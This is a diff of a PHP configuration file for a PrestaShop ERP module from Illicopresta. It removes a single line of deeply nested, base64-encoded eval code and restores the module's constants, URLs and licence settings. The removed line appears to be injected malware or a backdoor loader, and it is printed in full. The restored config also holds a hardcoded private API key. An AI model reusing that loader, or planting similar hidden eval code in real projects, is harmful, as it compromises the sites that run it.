@@ -1,1 +1,79 @@
-<?php function nZFFvLXrAQdViEMYKidF($XLlmJYYQcD){$r=base64_decode("YmFzZTY0X2RlY29kZSgkWExsbUpZWVFjRCk=");return eval("return $r;");} eval('?>'.nZFFvLXrAQdViEMYKidF('PD9waHAgZnVuY3Rpb24gSExXQk9zc2hncFNITlNRV3FFbW4oJHZqbUZaTFl5TGgpeyRyPWJhc2U2NF9kZWNvZGUoIlltRnpaVFkwWDJSbFkyOWtaU2drZG1wdFJscE1XWGxNYUNrPSIpO3JldHVybiBldmFsKCJyZXR1cm4gJHI7Iik7fSBldmFsKCc/PicuSExXQk9zc2hncFNITlNRV3FFbW4oJ1BEOXdhSEFOQ2lSSFRFOUNRVXhUV3lKcmRYQmpjR05qZEZka1dreFRUMkY1WkZkUUlsMDlZbUZ6WlRZMFgyUmxZMjlrWlNnaVVFUTVkMkZJUVdjaUtUc2tSMHhQUWtGTVUxc2lVMnQ1U1VoRWVtMWtUSEpIYW5SdFZYTkVUVUlpWFQxaVlYTmxOalJmWkdWamIyUmxLQ0pWUlZFMVpESkdTVkZYWkdGaWJGb3hWMVJPVTJOSFNYbE9SMlJVVFRKbmVsWnRkR3RsYkdSSlZteFNWazFYYURSWlZFcGhWakZzV0Zkc2NGUk5WbFoyVTJ0a1YxVXlTbk5VYm1SYVRXcEdTVmRVUWxKalIxWTFWVzVzVVZZd2NHOVpla3BXVFdzMVIwOVhkR0ZXTURVeVYydGtWbUl3YkhOaVNGSlRZbTVDYUZaclduSmtNV1JGVTJ4T2FWSnRkRFZVTVdRd1dWWlZlVnBJU2xoaVJuQk1Xa1phVm1Wc1JuUmpSMnhYVmpGS2VGWlhkRTlqYkVKVVUxaENVRTB3Y0hOYVJXaFhaVmRLY0ZGdGVHdGlWVnA2VXpCT1MyVldjRmxWYWtacVlsUlNibE5yYUVwT01HeHdZWHBrYlZVd1NuTmFSekZIWXpCMFJGbDVPVkZoVjA0eFZYcE9iMDB4V25KYVNIQllVMFphVlZaVVJtOWxSMFY1VjJ4a1dsWXhjR0ZWZWtaV1lqQnZlRkZyVmxCWFIxSnZWVEJXUjJKc1pIUk9WbVJyVm0xME5sWlhOVU5oVlRGeFZXMDFWMUpzVlRGVlZFcE9aV3hrZEUxWFJsTldNVXBKVmpKd1MxSXhUbk5UYTJSWFlUTm9XRlp0TlVOaU1YQkZWRzVLYVUxSVFrbFdWelZMVjJzd2VGZHNTbHBOYWxaVVZXcEdUbVF5UlhwUmJYaHNWbXR2TVZaVldtdFRNa1pJVkZoc1YxWkZjRkJWYlhCelkyeGtjMXBGT1d0aVNFSkpWbXhqTlZOdFNraGxSRUpXWWxSV00xZFdXbUZTTWtWNldrWm9VMUpZUWxWWFYzUmhZMjFXVms5V2FHdFNNRnBYVkZjeFUyVldXWGxrUjNST1VqQmFNRlpYZUd0VmJVcDBaVWhLVm1KR2NETldSbHBXWlVaU2RWTnNSbFpOUjNnelZraHdUMU15U2toVmEyeFhZbTE0Y0ZsV1ZrdGpNWEJJVFZWa2FrMUlVa1ZWTWpWeldWWmtSMU5ZYUZwTmFrRjNWMnBDZDFOV1RsVmFSWEJvVmpOTmVsZHRlRTlSTWtwSVZXNVNVMkpyTlUxVlZFcE9aR3hXU0dKSGNHdFdiRXBYVkRGV1QyRnJNSGhqU0ZKWVlURmFjbFZxUm5abFZrcHlZMFpPVTJKR2NFNVdiWGhoWkRKR1NGVlljR2hOYW14TVZGWldTMUpzVVhoaFIzUm9VbXMxUjFWdE1ERlhSMHBWVm14b1lWSnNjSGxhVjNoWFpGWkdkR0pGTldoaVJYQXhWbTF3U21ReVZraFNhMmhYWW10d1VGWnNXa3RpTVZaelZXdGtUbUpHY0hsV2JUQTFWMGRLVm1OR1pGVk5Wa3BZVmxkNGExTkdWbkZWYkdSVFZqSm9lRmRYY0VOa01VNUlWR3RzVW1KWVFrOVdiWGgyWld4YVdHVkhPVlZOYXpWWVZtMTRhMVpzWkVaVGJrNWhWbXh3VEZSc1dsZFNNWEJHWkVkb1UwMUVSVEZXYlhoVFV6RlJlRk51Um1sVFJYQlpXV3RrVTFWR2NFaGxTR1JVVW14d1dWUXhWbmRoVmtsNldqTmtWMVo2UVhoYVJFWnpWakZrY2xwSGFFNU5iRXBhVmxkMFYyUXhXa2RpU0VwWVltdHdjMVpzVW5OWFZuQkdXa1ZrVjJGNlJqQldWelZ6VjBaYWRGUnFVbHBsYTNCWVdYcEdhMk15U2tkVGJXaE9WMFZLTkZacldtcE5Wa1Y0Vmxob1dHSnJjRlpaYlhSM1ZXeGFWVkZ1VG10TlZra3lWa2QwTUdGV1NYaFRhM0JYWWxSV2VsbFdaRWRXYkU1MVZHMUdVMlZyV2tsWFdIQkRUVVpLUjFSdVZtbFNNRnBaVlcxMGMwNUdaRlZUV0dST1VtMDVNMWt3Vm5OV1JscElWV3QwV2xadFVqWlVWRVozWXpGU2NsUnRiRk5OVlc5M1ZsY3dNVlF4VWtkU1dHeFZWMFp3VjFWcVNqUmpWbkJIVjIxMGExSlVSbGxaVldRMFlVZFdjMWRyV2xoV2JGcFhXbFZrVTJNeFpISlhiV2hUWW10S2QxWnRlRk5qYXpGWFZteGthRkl6VW5OVmJYaExVMnhrVlZOVVZsUk5SRVpYVlRKMFlWWlZNVmhoU0VwYVZsWndVRlZ0ZUV0amF6bFhVMnMxYVZkSGFGWldiRkpEV1ZaVmVGTnVTbEJXYkhCV1dXdFdkMWRHV1hkYVJ6bFhZa1p3ZUZaSE5VOVdSVEZXVFZSV1YySllVblpaVmxwTFZtMU9SMVZzY0dsU01tZ3lWbTEwWVdOdFZrZGpSVlpXWVhwc2NGWnRkSGRYUmxwVlUxaG9VMDFyY0VoV01uaGhZV3hLV0ZWc1pGcGhNWEJvVlRCYVUxZEhWa2hrUm1SVFlYcFZkMVpzWkRSU01WbDNUVlZzVW1Kc2NGbFdNR2hEVkVaYWRHTXphR3BoZWxaWFYydGFRMVl3TUhoVGJUbFhZbGhDUTFSV1ZYaGpNWEJKVTIxR1UySklRbmRXUmxaclRrVXhSMVp1VW10VFJUVllXV3hXWVdWV1ZYbE9WV1JYWWxWV05WWkdVa2RXVmxsNllVWlNWbUpHY0ZCWk1WcFhaRWRPUjFSdGJGaFNhMVkwVm0wd2QyUXdNVmRYV0doaFUwVndUMVl3VlRGWFJteFlaRWRHV2xac2NEQlVWbHBMVkd4S2RHUjZTbFpOYmxKeVZqQmFTMk14VG5GU2JHUk9ZV3RaZWxadGRHRlRNV1JYVW01V2FsSnRhRmxWTUZaTFZWWmFjMVZyZEZOTlZYQXdWbTEwYzFadFNrZFhia0phWVRKb1JGcEVSbUZqTVdSelUyMTBUbEpIZUZoWFYzUnZVVEpHU0ZadVVsWmhNMmhYV1d0a1UxWkdXa2hsUjBaVFZtdGFlVnBGV2t0aFZrcHlZMFZzVjJFeVRqUlZla1pQWkVaT2RWUnNVbWxpYTBwb1YxWmtNRk15UmtkV2JrcGhVbFJXYzFacVFuZFNNVnBJVFZSQ2FGWnJOVWRWTWpGSFYwWmFkRlZxV2xWV2JIQk1Xa1ZhVjJSV1RuTmFSMnhUVFRKb00xWnRjRU5XTWxGNVZHeGtWV0pIYUhKVVZFcFRWVlphZEUxVVVrNVNiRm93Vkd4b2ExZHNXbk5qUldoYVZrVTFjbFl3V2t0U2JVNUhWV3h3YUUxWVFqVlhiRnBXVGxaa1NGVnJhRk5pUm5CUFdXeGFTMDB4V25STlNHaHJUVlZzTkZaWE5VOVZiVXBIVTJ4V1YwMUdXa3hXVmxwM1UxZE9SbFJzVmxOaVJuQkxWMWMxZDFFeFZrZFRia3BUWVd4d1YxWnVjRUpOVm14WVpVVmFhMDFWTlRGVk1uaHZZVlpKZUZOdE9WaFdSVXB5VlhwS1UxSXhaSE5oUmtKWFYwWktWVlp0Y0VkVE1WRjRWMjVLVm1Fd05WVlVWbFpoWld4YVdHUkhkRmRXTUhCWFdUQldNRmR0U2xsaFJYaGhWak5vZWxreFdrZGtSa3B6Vkd4T1RsSkZWWGhXTVdRd1ZqRlJlVkpZYkZSaE1uaFRXV3RvUTFsV1duRlVhelZzVW14YU1GUldXazloYlVwSFkwaHdXbUV5VW5wV01GcExWMVpHZFdGR1drNVdNVVkyVjJ0U1MxUnRVWGxUYTFwV1lrWndiMVJYTVc5V01WcFlaVVpPYWsxVmNFaFdiWGhyVmpKR2MxTnNhRlppVkVaVFZGWmFWbVZYVWtWUmJXeFRZVEozTVZkc1ZsZFVNVnAwVTJ4V1UxWkZTbGhXYTFaM1ZVWlpkMXBHWkZOV2JWSXdXa1ZhYTFZeFpFWlRibHBYVFc1b2FGWnFSazVsUms1MVZHeFNhVkp1UWxWWFZtUXdaREZrVjFkc1ZsSmliVkp2VkZaVmVFNUdXbGhPV0dSYVZsUkdWMVV4VWt0V1YwVjRVbXBPV21KWVVYZFdhMVV4VTBVMVYxSnNUbE5TTTJRMlZqRmFWMkl4Um5OaU0yUnFVa1phYjFwWE1WTlRNVlp5VlcwMWFtRXpRVEZaVkU1WFV6SldkVmt6V2xwTlIxSjJXa1JDYzFKR2EzcFJiRUpzVmxWV01sWlZaR3BQVmtKVVdUTkNUV0ZYVFRSVlJFNURZakpPUkZGWE5VeFdTRTV1VlVodk1GQlJQVDBpS1Rza1IweFBRa0ZNVTFzaVRFZFZVRnBKZFZGM1kwbGFTV0pyYUVraVhUMWlZWE5sTmpSZlpHVmpiMlJsS0NKWFZ6RkhaV3h3VlZkVVFsbE5iRXB6VjFSSk5XRXhjRlJhTW5SVlZteHZlVmt3WkZkbGJFMTVWVzAxWVZVeWN6a2lLVHNOQ2o4K1BEOXdhSEFnWm5WdVkzUnBiMjRnYlZoM2QxWmtUV2hQVW5obVNHUmlia0Y0V25Bb0pFMVdkbkJsYzB0a1oyVXBleVJ5UFdKaGMyVTJORjlrWldOdlpHVW9KRWRNVDBKQlRGTmJJa3hIVlZCYVNYVlJkMk5KV2tsaWEyaEpJbDBwTzNKbGRIVnliaUJsZG1Gc0tDSnlaWFIxY200Z0pISTdJaWs3ZlNCbGRtRnNLQ2MvUGljdWJWaDNkMVprVFdoUFVuaG1TR1JpYmtGNFduQW9KRWRNVDBKQlRGTmJJbE5yZVVsSVJIcHRaRXh5UjJwMGJWVnpSRTFDSWwwcExpUkhURTlDUVV4VFd5SnJkWEJqY0dOamRGZGtXa3hUVDJGNVpGZFFJbDBwT3lBL1BnPT0nKS4nPD9waHAgJyk7ID8+').'<?php '); ?>
+<?php
+/**
+* 2007-2013 PrestaShop
+*
+* NOTICE OF LICENSE
+*
+* This source file is subject to the Academic Free License (AFL 3.0)
+* that is bundled with this package in the file LICENSE.txt.
+* It is also available through the world-wide-web at this URL:
+* http://opensource.org/licenses/afl-3.0.php
+* If you did not receive a copy of the license and are unable to
+* obtain it through the world-wide-web, please send an email
+* to license@prestashop.com so we can send you a copy immediately.
+*
+* DISCLAIMER
+*
+* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
+* versions in the future. If you wish to customize PrestaShop for your
+* needs please refer to http://www.prestashop.com for more information.
+*
+*  @author    Illicopresta SA <contact@illicopresta.com>
+*  @copyright 2007-2015 Illicopresta
+*  @license   http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
+*  International Registered Trademark & Property of PrestaShop SA
+*/
+
+// PROD
+define('ERP_WS', 'http://apiv3.illicopresta.com/api/');
+
+// RCT
+//define('ERP_WS', 'http://apiv3-rct.illicopresta.com/api/');
+
+// DEV
+//define('ERP_WS', 'http://127.0.0.1/illicopresta_licence/api/');
+//define('ERP_WS', 'http://127.0.0.1/illicopresta_licence/api/');
+
+
+define('PRIVATE_KEY', 'db4e341a8a7c977573a47fad616839cfed610883');
+        
+// level satut : free, light or pro
+define('STATUS0', '334c4a4c42fdb79d7ebc3e73b517e6f8');  // none
+define('STATUS1', 'b24ce0cd392a5b0b8dedc66c25213594');  // Free
+define('STATUS2', '9914a0ce04a7b7b6a8e39bec55064b82');  // Light
+define('STATUS3', 'abd900517e55dce0437dac136a8568d7');  // Pro
+
+// Urls
+//define('ERP_URL_ESHOP', 'http://176.31.104.77/shop.illicoprestav99/');
+define('ERP_URL_ESHOP', 'http://shop.illicopresta.com/');
+define('URL_ESHOP_EN', 'http://shop.illicopresta.com/en/?utm_source=prestashop&utm_medium=back-office&utm_campaign=page-commande');
+define('URL_ESHOP_FR', 'http://shop.illicopresta.com/fr/?utm_source=prestashop&utm_medium=back-office&utm_campaign=page-commande');
+define('URL_TECHNICAL_SUPPORT_EN', 'https://addons.prestashop.com/en/write-to-developper?id_product=18033');
+define('URL_TECHNICAL_SUPPORT_FR', 'https://addons.prestashop.com/fr/ecrire-au-developpeur?id_product=18033s');
+define('URL_TECHNICAL_SUPPORT_IT', 'https://addons.prestashop.com/it/write-to-developper?id_product=18033');
+define('URL_TECHNICAL_SUPPORT_ES', 'https://addons.prestashop.com/es/write-to-developper?id_product=18033');
+
+define('ERP_TAGS_GA_COMMANDE', 'utm_source=prestashop&utm_medium=back-office&utm_campaign=page-commande');
+
+define('ERP_URL_DOC_EN', 'http://www.illicopresta.com/en/documentation-1-click-erp-2/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+define('ERP_URL_DOC_FR', 'http://www.illicopresta.com/documentation-1-click-erp/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+
+define('ERP_URL_CONTACT_FR', 'http://www.illicopresta.com/contact/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+define('ERP_URL_CONTACT_EN', 'http://www.illicopresta.com/en/contact-us/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+
+define('ERP_URL_CGU_FR', 'http://www.illicopresta.com/conditions-generales-vente/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+define('ERP_URL_CGU_EN', 'http://www.illicopresta.com/en/terms-and-conditions-of-sale/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+
+define('ERP_URL_VIDEO_FR','http://www.illicopresta.com/1-click-erp-pourquoi-et-comment-lutiliser-sur-prestashop/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+define('ERP_URL_VIDEO_EN','http://www.illicopresta.com/en/1-click-erp-how-to-use-it-and-why/?utm_source=back-office&utm_medium=page-de-configuration&utm_campaign=1-ClickERP');
+
+define('MIGRATION_URL', 'http://migration.illicopresta.com');
+
+define('ERP_STCKMGTFR', 10); 
+define('ERP_IVTFR', 10); 
+define('ERP_CMFOFR', 1); 
+define('ERP_ORDERFR', 3); // free order limitation 
+define('ERP_SLOT_IPTIMEMACHINE', 3); // limit of historic slots
+
+// Emails
+define('ERP_EMAIL_SUPPORT', 'support@illicopresta.com'); // email to contact support 
